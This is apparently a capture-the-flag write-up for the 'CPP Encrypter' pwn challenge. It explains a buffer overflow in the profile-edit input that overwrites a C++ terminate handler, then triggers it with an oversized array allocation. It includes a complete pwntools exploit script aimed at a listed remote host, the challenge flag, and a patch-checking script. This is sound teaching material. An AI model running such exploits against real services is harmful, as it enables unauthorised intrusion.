# Overview

**Challenge Name :** CPP Encrypter

**Author :** @Capang

**Description :** I love C so much that I code a CPP program using C syntax

## Analysis

```c
    puts("\n--- Edit Profile ---");
    printf("Enter new username (leave empty to keep current): ");
    fgets(local_418,0x404,stdin);
```

There is an obvious BOF here because the username is originally of size 256 but its taking in 1028 characters when you try to edit your profile.

![image](https://github.com/user-attachments/assets/f3cac91b-b0ee-42c7-ab91-da2e95044fa3)

After going through the things that we can overwrite, this function looked the most interesting. Judging from its name `terminate handler`, we assumed that if we somehow managed to terminate the program without the traditional way, we can overwrite this handler to point to a function that we want. But which function?

![image](https://github.com/user-attachments/assets/ef2b0b65-3d1c-47ee-8868-d44d2f2ee96e)

After doing abit of going through every single function in the program, you will eventually stumble upon this interesting function. Next step is how to terminate the program in a different way? 

```c
    if (0xfffffffffffffff < uVar2) {
      uVar3 = __cxa_throw_bad_array_new_length();
      goto LAB_004020f1;
    }
```

In the encrypt message function, if you give too many messages to encrypt, it will trigger bad array length. So the goal is simple

1. Overwrite terminate handler with the address of the useless function
2. Give a large number to encrypt message and terminate the program

## Solve Script

```py
#!/usr/bin/python
from pwn import *

filepath = './encryption_app'
exe = context.binary = ELF(filepath)

host = "116.203.176.73"
port = 59656

r = lambda x: p.recv(x)
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
cl = lambda: p.clean(timeout=1)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

def create(usr=b"a", pas=b"a"):
  sla(b"choice: ", "1")
  sla(b"username: ", usr) 
  sla(b"password: ", pas)

def login(usr=b"a", pas=b"a"):
  sla(b"choice: ", "2")
  sla(b"Username: ", usr) 
  sla(b"Password: ", pas)

def edit(usr=b"a", pas=b"a"):
  sla(b"choice: ", "3")
  sla(b": ", usr)
  # s(usr)
  sla(b": ", pas)

def encrypt(num, method, msg):
  sla(b"choice: ", "5")
  sla(b"hash? ", str(num))
  sla(b": ", msg)
  sla(b": ", str(method))

# p = exe.process()
p = remote(host,port)

win = 0x401976

create()
login()
payload = b"A" * 0x148
payload += p64(win)

edit(payload)

sla(b"choice: ", "5")
sla(b"hash? ", str(10000000000000000))

p.interactive()
```

![image](https://github.com/user-attachments/assets/108a3920-876b-4681-b223-317915787f21)

> Flag : UMCS{AW3S0ME_3NCRYPT0R_S0LLV33_73bb3661}

## SLA

```py
#!/usr/bin/env python3
"""
Service-health checker for the “Encrypt Messages” huge-array allocation bug.

Return codes:
0 – vulnerable / unpatched
1 – patched
2 – service down
"""
import socket
import sys
import time

# Status codes
UNPATCHED, PATCHED, DOWN = 0, 1, 2

# ======= helpers ============================================================

def recv_until(sock, marker: bytes, timeout=8.0) -> bool:
    """Receive until *marker* appears or timeout expires. Returns True on success."""
    sock.settimeout(timeout)
    data = b""
    try:
        while marker not in data:
            chunk = sock.recv(1024)
            if not chunk:
                return False          # connection closed
            data += chunk
        print(data)
        return True
    except (socket.timeout, ConnectionResetError):
        return False

def send_line(sock, line: str):
    sock.sendall(line.encode() + b"\n")

# ======= main check =========================================================

def run_check(host: str, port: int) -> int:
    try:
        s = socket.create_connection((host, port), timeout=3)
    except (socket.timeout, ConnectionRefusedError):
        return DOWN

    try:
        # Step 1: Create account
        if not recv_until(s, b"Enter choice: "):
            print(82)
            return DOWN
        send_line(s, "1")  # menu → Create Account
        print("creating account")

        if not recv_until(s, b"Enter username: "):
            print(222)
            return DOWN
        send_line(s, "t")  # 1-byte username keeps parsing simple

        if not recv_until(s, b"Enter password: "):
            return DOWN
        send_line(s, "t")
        print("created account")

        # Wait for success banner and next menu
        if not recv_until(s, b"Enter choice: "):
            return DOWN
        print("yes no?")

        # Step 2: Log in
        send_line(s, "2")
        if not recv_until(s, b"Username: "):
            return DOWN
        send_line(s, "t")
        if not recv_until(s, b"Password: "):
            return DOWN
        send_line(s, "t")
        if not recv_until(s, b"Login successful!\n"):
            return DOWN

        # print("login success")
        if not recv_until(s, b"Enter choice: "):
            return DOWN

        print("yes no?")

        # Step 3: Trigger the bug in “Encrypt Messages”
        send_line(s, "5")
        if not recv_until(s, b"How many messages to hash? "):
            return DOWN
        huge = "500000000000000000000"
        send_line(s, huge)
        print("sent big")

        # If the service is patched, it should send an error message **and**
        # return to the menu within a short window.
        patched_response = recv_until(s, b"Enter choice:", timeout=2)
    
        if patched_response:
            return PATCHED  # still alive → patched
        else:
            # Connection may already be dead; double-check with a tiny pause
            time.sleep(0.5)
            try:
                s.send(b"PING\n")
            except Exception:
                return UNPATCHED        # crashed → vulnerable
            return UNPATCHED            # still up but ignored us → treat as vuln
    finally:
        try:
            s.close()
        except Exception:
            pass

# ======= entry-point ========================================================

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 10102

    status = run_check(host, port)
    print(status)
    sys.exit(status)
```

The SLA script checks if you still are able to send a big number as the array length. There are probably many ways to patch this such as removing the call, adding jump instructions or modifying jump conditions so I'll just leave it up to you guys to find out :D
